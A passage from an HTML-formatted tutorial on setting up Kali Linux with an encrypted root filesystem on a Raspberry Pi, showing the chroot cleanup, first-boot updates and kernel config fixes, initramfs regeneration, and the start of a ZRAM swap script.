style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;uname&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -r&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/.config&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;   /boot/config-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;uname&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -r&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mkinitramfs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /boot/initramfs.zst&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;uname&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -r&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Cleanup our mess.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;umount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-root/boot&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;umount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-root/dev/pts&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;umount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-root/dev&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;umount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-root/sys&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;umount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-root/proc&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;umount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-root&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cryptsetup&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; luksClose&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; crypt_rootfs&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;umount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-boot&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;umount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/img-root&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;umount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/img-boot&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;losetup&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -D&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;rm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -rf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/ext-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /mnt/img-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;*&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Now comes the moment of truth: Shut down and unplug the Pi, remove the bootstrap microSD card and the reader, put the microSD card you just created (from the reader, with the encrypted ROOTFS) into the Pi, and then plug the Pi back in. If everything went right, you should be prompted to enter the decryption passphrase you set for the microSD card, after which boot will continue and you’ll be able to log into the desktop environment!&lt;/p&gt;\n&lt;p&gt;(Note that the console unlock message can sometimes get lost in the initial dmesg output.)&lt;/p&gt;\n&lt;h2 id=&quot;first-boot&quot;&gt;First boot&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#first-boot&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;After the first successful boot there’s some basic housekeeping that we should do.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Change the default user password.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;passwd&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Become root.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# System update. DPKG may ask you some questions during this&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# process.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;apt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; update&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;apt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; full-upgrade&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;apt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; autoremove&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --purge&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --autoremove&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;apt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; clean&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Update the (missing) kernel config.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/src/linux-headers-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ls&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /lib/modules&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; grep&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-Re4son-v8l+$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; sort&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; tail&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/.config&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;   /boot/config-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ls&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /lib/modules&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; grep&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-Re4son-v8l+$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; sort&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; tail&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Regenerate initramfs.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mkinitramfs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /boot/initramfs.zst&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t$(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ls&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /lib/modules&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; grep&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-Re4son-v8l+$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; sort&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; tail&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Drop permissions.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Kali Linux on the Raspberry Pi isn’t configured to use swap, which makes sense because normally it’s running from a slow microSD card. Still, having &lt;a href=&quot;https://haydenjames.io/linux-performance-almost-always-add-swap-space/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;some swap can aid system stability&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. We’re going to split the baby by &lt;a href=&quot;https://haydenjames.io/linux-performance-almost-always-add-swap-part2-zram/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;enabling ZRAM&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;Begin by create /usr/local/sbin/zram.sh:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#!/usr/bin/bash&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;case&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; in&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;start&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; )&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;\t\t# The &quot;-s&quot; option sets the size of the ZRAM device&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;\t\t# *before* compression; ZRAM will *actually* use&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;\t\t# something closer to 30% - 50% of this value, depending&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;\t\t# on the compression algorithm used. As a rule of thumb,&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;\t\t# set &quot;-s&quot; to be equal to the amount of RAM you actually&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;\t\t# have *or* 8G, whichever is *less*.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t\tZRAMDEV&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;zramctl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; 8G &lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;-a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; zstd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\t\tmkswap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $ZRAMDEV&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\t\tswapon&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $ZRAMDEV&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;stop&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; )&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\tfor&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; ZRAMDEV&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;awk&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/zram/ { print $1 }&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /proc/swaps&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; do&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\t\t\tswapoff&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; 